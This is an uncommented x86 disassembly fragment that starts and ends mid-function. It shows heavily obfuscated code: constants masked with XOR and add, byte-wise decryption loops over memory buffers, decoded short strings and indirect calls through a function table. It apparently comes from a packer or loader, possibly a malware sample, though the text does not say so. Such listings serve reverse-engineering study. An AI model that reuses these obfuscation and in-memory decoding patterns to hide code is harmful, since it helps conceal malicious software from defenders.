  4266d8:	mov    ecx,DWORD PTR [ebp-0x40]
  4266db:	xor    eax,ebx
  4266dd:	add    eax,esi
  4266df:	cmp    eax,ecx
  4266e1:	je     0x426e47
  4266e7:	mov    eax,DWORD PTR [ebp-0x10]
  4266ea:	xor    eax,ebx
  4266ec:	add    eax,esi
  4266ee:	jmp    0x42670c
  4266f0:	mov    edi,DWORD PTR [ebp-0x24]
  4266f3:	mov    cl,al
  4266f5:	and    cl,0x1f
  4266f8:	or     dl,0xff
  4266fb:	sub    dl,cl
  4266fd:	add    BYTE PTR [edi+eax*1],dl
  426700:	mov    ecx,DWORD PTR [ebp-0x18]
  426703:	xor    ecx,ebx
  426705:	lea    eax,[eax+ecx*1+0x3272f5]
  42670c:	mov    ecx,DWORD PTR [ebp-0x40]
  42670f:	cmp    eax,ecx
  426711:	jb     0x4266f0
  426713:	mov    eax,DWORD PTR [ebp-0x40]
  426716:	mov    DWORD PTR [ebp-0x28],eax
  426719:	mov    eax,DWORD PTR [ebp-0x24]
  42671c:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  426723:	mov    DWORD PTR [ebp-0xd4],eax
  426729:	mov    edi,0xf89c85a2
  42672e:	mov    DWORD PTR [ebp-0x2c],edi
  426731:	mov    eax,DWORD PTR [ebp-0x38]
  426734:	xor    eax,ebx
  426736:	add    eax,esi
  426738:	mov    DWORD PTR [ebp-0xc],eax
  42673b:	mov    eax,DWORD PTR [ebp-0x38]
  42673e:	xor    eax,ebx
  426740:	add    eax,esi
  426742:	mov    DWORD PTR [ebp-0x8],eax
  426745:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  42674c:	mov    DWORD PTR [ebp-0x4c],0xf89c85bc
  426753:	mov    eax,DWORD PTR [ebp-0x38]
  426756:	mov    ecx,DWORD PTR [ebp-0x28]
  426759:	xor    eax,ebx
  42675b:	add    eax,esi
  42675d:	cmp    ecx,eax
  42675f:	je     0x42695e
  426765:	jmp    0x42693a
  42676a:	mov    ecx,DWORD PTR [ebp-0xc]
  42676d:	mov    eax,DWORD PTR [ebp-0x28]
  426770:	sub    eax,ecx
  426772:	mov    ecx,DWORD PTR [ebp-0x48]
  426775:	xor    ecx,ebx
  426777:	add    ecx,esi
  426779:	xor    edx,edx
  42677b:	div    ecx
  42677d:	mov    DWORD PTR [ebp-0x8],eax
  426780:	mov    eax,DWORD PTR [ebp-0x4c]
  426783:	mov    ecx,DWORD PTR [ebp-0x8]
  426786:	xor    eax,ebx
  426788:	add    eax,esi
  42678a:	cmp    ecx,eax
  42678c:	jbe    0x426798
  42678e:	mov    eax,DWORD PTR [ebp-0x4c]
  426791:	xor    eax,ebx
  426793:	add    eax,esi
  426795:	mov    DWORD PTR [ebp-0x8],eax
  426798:	mov    eax,DWORD PTR [ebp-0x48]
  42679b:	mov    ecx,DWORD PTR [ebp-0x8]
  42679e:	xor    eax,ebx
  4267a0:	add    eax,esi
  4267a2:	imul   eax,ecx
  4267a5:	mov    DWORD PTR [ebp-0x8],eax
  4267a8:	mov    eax,DWORD PTR [ebp-0x38]
  4267ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4267ae:	xor    eax,ebx
  4267b0:	add    eax,esi
  4267b2:	cmp    ecx,eax
  4267b4:	je     0x426928
  4267ba:	mov    eax,DWORD PTR [ebp-0x8]
  4267bd:	mov    DWORD PTR [ebp-0x14],eax
  4267c0:	mov    eax,DWORD PTR [ebp-0xc]
  4267c3:	add    eax,DWORD PTR [ebp-0xd4]
  4267c9:	mov    DWORD PTR [ebp-0x20],0xf89c85a5
  4267d0:	mov    DWORD PTR [ebp-0x34],edi
  4267d3:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  4267dd:	mov    DWORD PTR [ebp-0x8],eax
  4267e0:	mov    DWORD PTR [ebp-0x30],0xf89c85a0
  4267e7:	mov    DWORD PTR [ebp-0x1c],edi
  4267ea:	mov    eax,DWORD PTR [ebp-0x20]
  4267ed:	xor    eax,ebx
  4267ef:	add    eax,esi
  4267f1:	jmp    0x4268e7
  4267f6:	mov    DWORD PTR [ebp-0xe0],0xf89c85b8
  426800:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  42680a:	mov    eax,DWORD PTR [ebp-0x1c]
  42680d:	mov    ecx,DWORD PTR [ebp-0x44]
  426810:	xor    eax,ebx
  426812:	add    eax,esi
  426814:	imul   eax,ecx
  426817:	mov    ecx,DWORD PTR [ebp-0x8]
  42681a:	mov    al,BYTE PTR [eax+ecx*1]
  42681d:	mov    BYTE PTR [ebp-0x2],al
  426820:	mov    eax,DWORD PTR [ebp-0x1c]
  426823:	mov    ecx,DWORD PTR [ebp-0x44]
  426826:	xor    eax,ebx
  426828:	add    eax,esi
  42682a:	imul   eax,ecx
  42682d:	mov    ecx,DWORD PTR [ebp-0xe8]
  426833:	xor    ecx,ebx
  426835:	add    eax,ecx
  426837:	mov    ecx,DWORD PTR [ebp-0x8]
  42683a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426842:	mov    ecx,DWORD PTR [ebp-0xe0]
  426848:	xor    ecx,ebx
  42684a:	lea    eax,[ecx+eax*1+0x3272f5]
  426851:	movzx  ecx,BYTE PTR [ebp-0x2]
  426855:	xor    ecx,eax
  426857:	mov    BYTE PTR [ebp-0x2],cl
  42685a:	mov    al,BYTE PTR [ebp-0x2]
  42685d:	mov    ecx,DWORD PTR [ebp-0x1c]
  426860:	mov    edx,DWORD PTR [ebp-0x44]
  426863:	xor    ecx,ebx
  426865:	add    ecx,esi
  426867:	imul   ecx,edx
  42686a:	mov    edx,DWORD PTR [ebp-0x8]
  42686d:	mov    BYTE PTR [ecx+edx*1],al
  426870:	mov    eax,DWORD PTR [ebp-0x1c]
  426873:	mov    ecx,DWORD PTR [ebp-0x44]
  426876:	xor    eax,ebx
  426878:	add    eax,esi
  42687a:	imul   eax,ecx
  42687d:	mov    ecx,DWORD PTR [ebp-0x8]
  426880:	mov    al,BYTE PTR [eax+ecx*1]
  426883:	mov    BYTE PTR [ebp-0x2],al
  426886:	mov    eax,DWORD PTR [ebp-0x1c]
  426889:	mov    ecx,DWORD PTR [ebp-0x44]
  42688c:	xor    eax,ebx
  42688e:	add    eax,esi
  426890:	imul   eax,ecx
  426893:	mov    ecx,DWORD PTR [ebp-0x34]
  426896:	xor    ecx,ebx
  426898:	add    eax,ecx
  42689a:	mov    ecx,DWORD PTR [ebp-0x8]
  42689d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  4268a5:	mov    ecx,DWORD PTR [ebp-0xc4]
  4268ab:	xor    ecx,ebx
  4268ad:	lea    eax,[ecx+eax*1+0x3272f5]
  4268b4:	movzx  ecx,BYTE PTR [ebp-0x2]
  4268b8:	xor    ecx,eax
  4268ba:	mov    BYTE PTR [ebp-0x2],cl
  4268bd:	mov    al,BYTE PTR [ebp-0x2]
  4268c0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4268c3:	mov    edx,DWORD PTR [ebp-0x44]
  4268c6:	xor    ecx,ebx
  4268c8:	add    ecx,esi
  4268ca:	imul   ecx,edx
  4268cd:	mov    edx,DWORD PTR [ebp-0x8]
  4268d0:	mov    BYTE PTR [ecx+edx*1],al
  4268d3:	mov    eax,DWORD PTR [ebp-0x30]
  4268d6:	mov    ecx,DWORD PTR [ebp-0x34]
  4268d9:	xor    eax,ebx
  4268db:	xor    ecx,ebx
  4268dd:	add    eax,esi
  4268df:	add    ecx,esi
  4268e1:	imul   eax,ecx
  4268e4:	add    eax,DWORD PTR [ebp-0x44]
  4268e7:	mov    DWORD PTR [ebp-0x44],eax
  4268ea:	mov    eax,DWORD PTR [ebp-0x44]
  4268ed:	mov    ecx,DWORD PTR [ebp-0x14]
  4268f0:	cmp    ecx,eax
  4268f2:	jb     0x4267f6
  4268f8:	mov    eax,DWORD PTR [ebp-0x34]
  4268fb:	mov    ecx,DWORD PTR [ebp-0x14]
  4268fe:	xor    eax,ebx
  426900:	add    eax,esi
  426902:	imul   eax,ecx
  426905:	mov    ecx,DWORD PTR [ebp-0x20]
  426908:	xor    ecx,ebx
  42690a:	add    ecx,esi
  42690c:	or     eax,ecx
  42690e:	mov    ecx,DWORD PTR [ebp-0x2c]
  426911:	xor    ecx,ebx
  426913:	add    eax,ecx
  426915:	mov    ecx,DWORD PTR [ebp-0x2c]
  426918:	xor    ecx,ebx
  42691a:	add    eax,ecx
  42691c:	mov    ecx,DWORD PTR [ebp-0xc]
  42691f:	lea    eax,[eax+ecx*1+0x64e5ea]
  426926:	jmp    0x426937
  426928:	mov    eax,DWORD PTR [ebp-0x2c]
  42692b:	mov    ecx,DWORD PTR [ebp-0xc]
  42692e:	xor    eax,ebx
  426930:	lea    eax,[eax+ecx*1+0x3272f5]
  426937:	mov    DWORD PTR [ebp-0xc],eax
  42693a:	mov    eax,DWORD PTR [ebp-0x2c]
  42693d:	xor    eax,ebx
  42693f:	mov    ecx,0xffcd8d0b
  426944:	sub    ecx,eax
  426946:	add    ecx,DWORD PTR [ebp-0x28]
  426949:	mov    eax,DWORD PTR [ebp-0x2c]
  42694c:	mov    edx,DWORD PTR [ebp-0xc]
  42694f:	xor    eax,ebx
  426951:	add    eax,esi
  426953:	imul   eax,edx
  426956:	cmp    eax,ecx
  426958:	jbe    0x42676a
  42695e:	mov    eax,DWORD PTR [ebp-0x10]
  426961:	mov    ecx,DWORD PTR [ebp-0x40]
  426964:	mov    eax,DWORD PTR [ebp+0x8]
  426967:	mov    edx,DWORD PTR [ebp-0x54]
  42696a:	mov    eax,DWORD PTR [eax+0x1e0]
  426970:	xor    edx,ebx
  426972:	add    edx,esi
  426974:	push   edx
  426975:	mov    edx,DWORD PTR [ebp-0x3c]
  426978:	xor    edx,ebx
  42697a:	add    edx,esi
  42697c:	push   edx
  42697d:	push   ecx
  42697e:	mov    DWORD PTR [ebp-0x30],ecx
  426981:	mov    ecx,DWORD PTR [ebp-0x10]
  426984:	xor    ecx,ebx
  426986:	add    ecx,esi
  426988:	push   ecx
  426989:	call   DWORD PTR [eax+0x14]
  42698c:	mov    edi,eax
  42698e:	mov    eax,DWORD PTR [ebp-0x10]
  426991:	xor    eax,ebx
  426993:	add    eax,esi
  426995:	cmp    eax,edi
  426997:	je     0x4269f2
  426999:	mov    eax,DWORD PTR [ebp-0x10]
  42699c:	jmp    0x4269bf
  42699e:	mov    ecx,DWORD PTR [ebp-0x24]
  4269a1:	xor    eax,ebx
  4269a3:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f5]
  4269aa:	mov    BYTE PTR [eax+edi*1+0x3272f5],cl
  4269b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4269b4:	xor    ecx,ebx
  4269b6:	lea    eax,[ecx+eax*1+0x3272f5]
  4269bd:	xor    eax,ebx
  4269bf:	mov    ecx,DWORD PTR [ebp-0x40]
  4269c2:	sub    ecx,esi
  4269c4:	xor    ecx,ebx
  4269c6:	cmp    eax,ecx
  4269c8:	jne    0x42699e
  4269ca:	mov    eax,DWORD PTR [ebp+0x8]
  4269cd:	mov    ecx,DWORD PTR [ebp-0x50]
  4269d0:	mov    eax,DWORD PTR [eax+0x1e0]
  4269d6:	xor    ecx,ebx
  4269d8:	add    ecx,esi
  4269da:	push   ecx
  4269db:	mov    ecx,DWORD PTR [ebp-0x10]
  4269de:	xor    ecx,ebx
  4269e0:	add    ecx,esi
  4269e2:	push   ecx
  4269e3:	push   DWORD PTR [ebp-0x24]
  4269e6:	call   DWORD PTR [eax+0x18]
  4269e9:	mov    eax,DWORD PTR [ebp-0x30]
  4269ec:	mov    DWORD PTR [ebp-0x24],edi
  4269ef:	mov    DWORD PTR [ebp-0x40],eax
  4269f2:	mov    edi,DWORD PTR [ebp-0x24]
  4269f5:	mov    eax,DWORD PTR [ebp-0x18]
  4269f8:	mov    ecx,DWORD PTR [ebp-0x10]
  4269fb:	xor    eax,ebx
  4269fd:	mov    DWORD PTR [ebp-0x30],edi
  426a00:	add    eax,esi
  426a02:	mov    DWORD PTR [ebp-0x5c],0x402b332b
  426a09:	mov    DWORD PTR [ebp-0x58],0x362b3e2b
  426a10:	jmp    0x426a44
  426a12:	xor    ecx,ebx
  426a14:	mov    dl,BYTE PTR [ebp+ecx*1+0x327299]
  426a1b:	xor    dl,0x7e
  426a1e:	add    dl,0x3
  426a21:	mov    DWORD PTR [ebp-0x3c],ecx
  426a24:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f5]
  426a2c:	movzx  edx,dl
  426a2f:	cmp    ecx,edx
  426a31:	jne    0x426a4e
  426a33:	mov    ecx,DWORD PTR [ebp-0x18]
  426a36:	mov    edx,DWORD PTR [ebp-0x3c]
  426a39:	xor    ecx,ebx
  426a3b:	lea    ecx,[ecx+edx*1+0x3272f5]
  426a42:	xor    ecx,ebx
  426a44:	cmp    ecx,0xf89c85bd
  426a4a:	jne    0x426a12
  426a4c:	jmp    0x426a55
  426a4e:	mov    eax,DWORD PTR [ebp-0x10]
  426a51:	xor    eax,ebx
  426a53:	add    eax,esi
  426a55:	mov    ecx,DWORD PTR [ebp-0x10]
  426a58:	xor    ecx,ebx
  426a5a:	add    ecx,esi
  426a5c:	cmp    ecx,eax
  426a5e:	je     0x426bd1
  426a64:	mov    eax,DWORD PTR [edi+0x8]
  426a67:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426a6e:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d4
  426a75:	mov    DWORD PTR [ebp-0x48],0xf89cb5a5
  426a7c:	mov    DWORD PTR [ebp-0x20],0xf89c85a1
  426a83:	mov    DWORD PTR [ebp-0x14],eax
  426a86:	mov    eax,DWORD PTR [ebp+0x8]
  426a89:	mov    ecx,DWORD PTR [ebp-0x20]
  426a8c:	xor    ecx,ebx
  426a8e:	add    ecx,esi
  426a90:	push   ecx
  426a91:	mov    ecx,DWORD PTR [ebp-0x48]
  426a94:	mov    eax,DWORD PTR [eax+0x1e0]
  426a9a:	xor    ecx,ebx
  426a9c:	add    ecx,esi
  426a9e:	push   ecx
  426a9f:	mov    ecx,DWORD PTR [ebp-0x3c]
  426aa2:	xor    ecx,ebx
  426aa4:	add    ecx,esi
  426aa6:	push   ecx
  426aa7:	mov    ecx,DWORD PTR [ebp-0xc]
  426aaa:	xor    ecx,ebx
  426aac:	add    ecx,esi
  426aae:	push   ecx
  426aaf:	call   DWORD PTR [eax+0x14]
  426ab2:	mov    edi,eax
  426ab4:	mov    eax,DWORD PTR [ebp+0x8]
  426ab7:	mov    ecx,DWORD PTR [ebp-0x20]
  426aba:	mov    eax,DWORD PTR [eax+0x1e0]
  426ac0:	xor    ecx,ebx
  426ac2:	add    ecx,esi
  426ac4:	push   ecx
  426ac5:	mov    ecx,DWORD PTR [ebp-0x48]
  426ac8:	xor    ecx,ebx
  426aca:	add    ecx,esi
  426acc:	push   ecx
  426acd:	mov    ecx,DWORD PTR [ebp-0xc]
  426ad0:	push   DWORD PTR [ebp-0x14]
  426ad3:	xor    ecx,ebx
  426ad5:	add    ecx,esi
  426ad7:	push   ecx
  426ad8:	call   DWORD PTR [eax+0x14]
  426adb:	mov    ecx,DWORD PTR [ebp-0xc]
  426ade:	xor    ecx,ebx
  426ae0:	add    ecx,esi
  426ae2:	mov    DWORD PTR [ebp-0x20],eax
  426ae5:	cmp    ecx,edi
  426ae7:	je     0x426e74
  426aed:	mov    ecx,DWORD PTR [ebp-0xc]
  426af0:	xor    ecx,ebx
  426af2:	add    ecx,esi
  426af4:	cmp    ecx,eax
  426af6:	je     0x426e74
  426afc:	mov    DWORD PTR [ebp-0x3c],0xf89c85a0
  426b03:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  426b0a:	mov    ecx,DWORD PTR [ebp-0x3c]
  426b0d:	xor    cl,0xae
  426b10:	sub    cl,0xb
  426b13:	mov    BYTE PTR [edi],cl
  426b15:	mov    ecx,DWORD PTR [ebp-0xc]
  426b18:	xor    cl,0xae
  426b1b:	sub    cl,0xb
  426b1e:	mov    BYTE PTR [edi+0x1],cl
  426b21:	mov    ecx,DWORD PTR [ebp-0x54]
  426b24:	xor    cl,0xae
  426b27:	sub    cl,0xb
  426b2a:	mov    BYTE PTR [edi+0x2],cl
  426b2d:	and    DWORD PTR [ebp-0xc8],0x0
  426b34:	and    DWORD PTR [ebp-0xdc],0x0
  426b3b:	lea    ecx,[ebp-0xdc]
  426b41:	push   ecx
  426b42:	push   DWORD PTR [ebp-0x14]
  426b45:	push   eax
  426b46:	lea    eax,[ebp-0xc8]
  426b4c:	push   eax
  426b4d:	mov    eax,DWORD PTR [ebp-0x30]
  426b50:	push   DWORD PTR [eax+0xc]
  426b53:	mov    eax,DWORD PTR [ebp-0x24]
  426b56:	add    eax,0x10
  426b59:	push   eax
  426b5a:	push   edi
  426b5b:	call   0x425e01
  426b60:	mov    DWORD PTR [ebp-0x3c],eax
  426b63:	mov    eax,DWORD PTR [ebp+0x8]
  426b66:	mov    ecx,DWORD PTR [ebp-0x50]
  426b69:	mov    eax,DWORD PTR [eax+0x1e0]
  426b6f:	xor    ecx,ebx
  426b71:	add    ecx,esi
  426b73:	push   ecx
  426b74:	mov    ecx,DWORD PTR [ebp-0xc]
  426b77:	xor    ecx,ebx
  426b79:	add    ecx,esi
  426b7b:	push   ecx
  426b7c:	push   edi
  426b7d:	call   DWORD PTR [eax+0x18]
  426b80:	mov    eax,DWORD PTR [ebp-0x3c]
  426b83:	add    eax,0xffcd8d0b
  426b88:	xor    eax,ebx
  426b8a:	cmp    eax,0xf89c85a5
  426b8f:	mov    eax,DWORD PTR [ebp+0x8]
  426b92:	mov    eax,DWORD PTR [eax+0x1e0]
  426b98:	mov    ecx,DWORD PTR [ebp-0x50]
  426b9b:	jne    0x426bbe
  426b9d:	xor    ecx,ebx
  426b9f:	add    ecx,esi
  426ba1:	push   ecx
  426ba2:	mov    ecx,DWORD PTR [ebp-0xc]
  426ba5:	xor    ecx,ebx
  426ba7:	add    ecx,esi
  426ba9:	push   ecx
  426baa:	push   DWORD PTR [ebp-0x24]
  426bad:	call   DWORD PTR [eax+0x18]
  426bb0:	mov    eax,DWORD PTR [ebp-0x20]
  426bb3:	mov    DWORD PTR [ebp-0x24],eax
  426bb6:	mov    eax,DWORD PTR [ebp-0x14]
  426bb9:	mov    DWORD PTR [ebp-0x40],eax
  426bbc:	jmp    0x426bd1
  426bbe:	xor    ecx,ebx
  426bc0:	add    ecx,esi
  426bc2:	push   ecx
  426bc3:	mov    ecx,DWORD PTR [ebp-0xc]
  426bc6:	xor    ecx,ebx
  426bc8:	add    ecx,esi
  426bca:	push   ecx
  426bcb:	push   DWORD PTR [ebp-0x20]
  426bce:	call   DWORD PTR [eax+0x18]
  426bd1:	mov    eax,DWORD PTR [ebp-0x40]
  426bd4:	mov    DWORD PTR [ebp-0x38],eax
  426bd7:	mov    eax,DWORD PTR [ebp-0x24]
  426bda:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  426be1:	mov    DWORD PTR [ebp-0x3c],eax
  426be4:	mov    edi,0xf89c85a2
  426be9:	mov    DWORD PTR [ebp-0x2c],edi
  426bec:	mov    eax,DWORD PTR [ebp-0x28]
  426bef:	xor    eax,ebx
  426bf1:	add    eax,esi
  426bf3:	mov    DWORD PTR [ebp-0xc],eax
  426bf6:	mov    eax,DWORD PTR [ebp-0x28]
  426bf9:	xor    eax,ebx
  426bfb:	add    eax,esi
  426bfd:	mov    DWORD PTR [ebp-0x14],eax
  426c00:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  426c07:	mov    DWORD PTR [ebp-0x20],0xf89c85bc
  426c0e:	mov    eax,DWORD PTR [ebp-0x28]
  426c11:	mov    ecx,DWORD PTR [ebp-0x38]
  426c14:	xor    eax,ebx
  426c16:	add    eax,esi
  426c18:	cmp    ecx,eax
  426c1a:	je     0x426e10
  426c20:	jmp    0x426dec
  426c25:	mov    ecx,DWORD PTR [ebp-0xc]
  426c28:	mov    eax,DWORD PTR [ebp-0x38]
  426c2b:	sub    eax,ecx
  426c2d:	mov    ecx,DWORD PTR [ebp-0x48]
  426c30:	xor    ecx,ebx
  426c32:	add    ecx,esi
  426c34:	xor    edx,edx
  426c36:	div    ecx
  426c38:	mov    DWORD PTR [ebp-0x14],eax
  426c3b:	mov    eax,DWORD PTR [ebp-0x20]
  426c3e:	mov    ecx,DWORD PTR [ebp-0x14]
  426c41:	xor    eax,ebx
  426c43:	add    eax,esi
  426c45:	cmp    ecx,eax
  426c47:	jbe    0x426c53
  426c49:	mov    eax,DWORD PTR [ebp-0x20]
  426c4c:	xor    eax,ebx
  426c4e:	add    eax,esi
  426c50:	mov    DWORD PTR [ebp-0x14],eax
  426c53:	mov    eax,DWORD PTR [ebp-0x48]
  426c56:	mov    ecx,DWORD PTR [ebp-0x14]
  426c59:	xor    eax,ebx
  426c5b:	add    eax,esi
  426c5d:	imul   eax,ecx
  426c60:	mov    DWORD PTR [ebp-0x14],eax
  426c63:	mov    eax,DWORD PTR [ebp-0x28]
  426c66:	mov    ecx,DWORD PTR [ebp-0x14]
  426c69:	xor    eax,ebx
  426c6b:	add    eax,esi
  426c6d:	cmp    ecx,eax
  426c6f:	je     0x426dda
  426c75:	mov    eax,DWORD PTR [ebp-0x14]
  426c78:	mov    DWORD PTR [ebp-0x34],eax
  426c7b:	mov    eax,DWORD PTR [ebp-0xc]
  426c7e:	add    eax,DWORD PTR [ebp-0x3c]
  426c81:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  426c88:	mov    DWORD PTR [ebp-0x14],edi
  426c8b:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  426c92:	mov    DWORD PTR [ebp-0x1c],eax
  426c95:	mov    DWORD PTR [ebp-0x30],0xf89c85a0
  426c9c:	mov    DWORD PTR [ebp-0x8],edi
  426c9f:	mov    eax,DWORD PTR [ebp-0x4c]
  426ca2:	xor    eax,ebx
  426ca4:	add    eax,esi
  426ca6:	jmp    0x426d99
  426cab:	mov    DWORD PTR [ebp-0xe4],0xf89c85b8
  426cb5:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  426cbf:	mov    eax,DWORD PTR [ebp-0x8]
  426cc2:	mov    ecx,DWORD PTR [ebp-0x18]
  426cc5:	xor    eax,ebx
  426cc7:	add    eax,esi
  426cc9:	imul   eax,ecx
  426ccc:	mov    ecx,DWORD PTR [ebp-0x1c]
  426ccf:	mov    al,BYTE PTR [eax+ecx*1]
  426cd2:	mov    BYTE PTR [ebp-0x1],al
  426cd5:	mov    eax,DWORD PTR [ebp-0x8]
  426cd8:	mov    ecx,DWORD PTR [ebp-0x18]
  426cdb:	xor    eax,ebx
  426cdd:	add    eax,esi
  426cdf:	imul   eax,ecx
  426ce2:	mov    ecx,DWORD PTR [ebp-0x54]
  426ce5:	xor    ecx,ebx
  426ce7:	add    eax,ecx
  426ce9:	mov    ecx,DWORD PTR [ebp-0x1c]
  426cec:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426cf4:	mov    ecx,DWORD PTR [ebp-0xe4]
  426cfa:	xor    ecx,ebx
  426cfc:	lea    eax,[ecx+eax*1+0x3272f5]
  426d03:	movzx  ecx,BYTE PTR [ebp-0x1]
  426d07:	xor    ecx,eax
  426d09:	mov    BYTE PTR [ebp-0x1],cl
  426d0c:	mov    al,BYTE PTR [ebp-0x1]
  426d0f:	mov    ecx,DWORD PTR [ebp-0x8]
  426d12:	mov    edx,DWORD PTR [ebp-0x18]
  426d15:	xor    ecx,ebx
  426d17:	add    ecx,esi
  426d19:	imul   ecx,edx
  426d1c:	mov    edx,DWORD PTR [ebp-0x1c]
  426d1f:	mov    BYTE PTR [ecx+edx*1],al
  426d22:	mov    eax,DWORD PTR [ebp-0x8]
  426d25:	mov    ecx,DWORD PTR [ebp-0x18]
  426d28:	xor    eax,ebx
  426d2a:	add    eax,esi
  426d2c:	imul   eax,ecx
  426d2f:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d32:	mov    al,BYTE PTR [eax+ecx*1]
  426d35:	mov    BYTE PTR [ebp-0x1],al
  426d38:	mov    eax,DWORD PTR [ebp-0x8]
  426d3b:	mov    ecx,DWORD PTR [ebp-0x18]
  426d3e:	xor    eax,ebx
  426d40:	add    eax,esi
  426d42:	imul   eax,ecx
  426d45:	mov    ecx,DWORD PTR [ebp-0x14]
  426d48:	xor    ecx,ebx
  426d4a:	add    eax,ecx
  426d4c:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d4f:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426d57:	mov    ecx,DWORD PTR [ebp-0xd0]
  426d5d:	xor    ecx,ebx
  426d5f:	lea    eax,[ecx+eax*1+0x3272f5]
  426d66:	movzx  ecx,BYTE PTR [ebp-0x1]
  426d6a:	xor    ecx,eax
  426d6c:	mov    BYTE PTR [ebp-0x1],cl
  426d6f:	mov    al,BYTE PTR [ebp-0x1]
  426d72:	mov    ecx,DWORD PTR [ebp-0x8]
  426d75:	mov    edx,DWORD PTR [ebp-0x18]
  426d78:	xor    ecx,ebx
  426d7a:	add    ecx,esi
  426d7c:	imul   ecx,edx
  426d7f:	mov    edx,DWORD PTR [ebp-0x1c]
  426d82:	mov    BYTE PTR [ecx+edx*1],al
  426d85:	mov    eax,DWORD PTR [ebp-0x30]
  426d88:	mov    ecx,DWORD PTR [ebp-0x14]
  426d8b:	xor    eax,ebx
  426d8d:	xor    ecx,ebx
  426d8f:	add    eax,esi
  426d91:	add    ecx,esi
  426d93:	imul   eax,ecx
  426d96:	add    eax,DWORD PTR [ebp-0x18]
  426d99:	mov    DWORD PTR [ebp-0x18],eax
  426d9c:	mov    eax,DWORD PTR [ebp-0x18]
  426d9f:	mov    ecx,DWORD PTR [ebp-0x34]
  426da2:	cmp    ecx,eax
  426da4:	jb     0x426cab
  426daa:	mov    eax,DWORD PTR [ebp-0x14]
  426dad:	mov    ecx,DWORD PTR [ebp-0x34]
  426db0:	xor    eax,ebx
  426db2:	add    eax,esi
  426db4:	imul   eax,ecx
  426db7:	mov    ecx,DWORD PTR [ebp-0x4c]
  426dba:	xor    ecx,ebx
  426dbc:	add    ecx,esi
  426dbe:	or     eax,ecx
  426dc0:	mov    ecx,DWORD PTR [ebp-0x2c]
  426dc3:	xor    ecx,ebx
  426dc5:	add    eax,ecx
  426dc7:	mov    ecx,DWORD PTR [ebp-0x2c]
  426dca:	xor    ecx,ebx
  426dcc:	add    eax,ecx
  426dce:	mov    ecx,DWORD PTR [ebp-0xc]
  426dd1:	lea    eax,[eax+ecx*1+0x64e5ea]
  426dd8:	jmp    0x426de9
  426dda:	mov    eax,DWORD PTR [ebp-0x2c]
  426ddd:	mov    ecx,DWORD PTR [ebp-0xc]
  426de0:	xor    eax,ebx
  426de2:	lea    eax,[eax+ecx*1+0x3272f5]
  426de9:	mov    DWORD PTR [ebp-0xc],eax
  426dec:	mov    eax,DWORD PTR [ebp-0x2c]
  426def:	xor    eax,ebx
  426df1:	mov    ecx,0xffcd8d0b
  426df6:	sub    ecx,eax
  426df8:	add    ecx,DWORD PTR [ebp-0x38]
  426dfb:	mov    eax,DWORD PTR [ebp-0x2c]
  426dfe:	mov    edx,DWORD PTR [ebp-0xc]
  426e01:	xor    eax,ebx
  426e03:	add    eax,esi
  426e05:	imul   eax,edx
  426e08:	cmp    eax,ecx
  426e0a:	jbe    0x426c25
  426e10:	push   DWORD PTR [ebp+0x8]
  426e13:	mov    eax,DWORD PTR [ebp+0x8]
  426e16:	push   DWORD PTR [eax+0x1cc]
  426e1c:	lea    eax,[ebp-0xd8]
  426e22:	push   eax
  426e23:	mov    eax,DWORD PTR [ebp+0x8]
  426e26:	mov    eax,DWORD PTR [eax+0x1c4]
  426e2c:	push   DWORD PTR [eax]
  426e2e:	mov    eax,DWORD PTR [ebp+0x8]
  426e31:	mov    eax,DWORD PTR [eax+0x1c0]
  426e37:	push   DWORD PTR [eax]
  426e39:	push   DWORD PTR [ebp-0x40]
  426e3c:	push   DWORD PTR [ebp-0x24]
  426e3f:	call   0x4278d6
  426e44:	mov    DWORD PTR [ebp-0x3c],eax
  426e47:	mov    eax,DWORD PTR [ebp-0x10]
  426e4a:	mov    ecx,DWORD PTR [ebp-0x24]
  426e4d:	xor    eax,ebx
  426e4f:	add    eax,esi
  426e51:	cmp    eax,ecx
  426e53:	je     0x426e74
  426e55:	mov    eax,DWORD PTR [ebp+0x8]
  426e58:	mov    ecx,DWORD PTR [ebp-0x50]
  426e5b:	mov    eax,DWORD PTR [eax+0x1e0]
  426e61:	xor    ecx,ebx
  426e63:	add    ecx,esi
  426e65:	push   ecx
  426e66:	mov    ecx,DWORD PTR [ebp-0x10]
  426e69:	xor    ecx,ebx
  426e6b:	add    ecx,esi
  426e6d:	push   ecx
  426e6e:	push   DWORD PTR [ebp-0x24]
  426e71:	call   DWORD PTR [eax+0x18]
  426e74:	pop    edi
  426e75:	pop    esi
  426e76:	pop    ebx
  426e77:	leave  
  426e78:	ret    0x4
  426e7b:	push   ebp
  426e7c:	mov    ebp,esp
  426e7e:	push   ecx
  426e7f:	push   ecx
  426e80:	lea    eax,[ebp-0x8]
  426e83:	mov    DWORD PTR [ebp-0x4],eax
  426e86:	push   esi
  426e87:	mov    esi,DWORD PTR [ebp-0x4]
  426e8a:	mov    eax,0xf881ba2f
  426e8f:	mov    DWORD PTR [esi],eax
  426e91:	mov    esi,DWORD PTR [ebp-0x8]
  426e94:	cmp    esi,eax
  426e96:	pop    esi
  426e97:	jne    0x426ea1
  426e99:	mov    BYTE PTR [ecx+0xa],0x83
  426e9d:	mov    BYTE PTR [edx+0x8],0x2e
  426ea1:	mov    BYTE PTR [edx+0xa],0x83
  426ea5:	mov    BYTE PTR [ecx+0x2],0x15
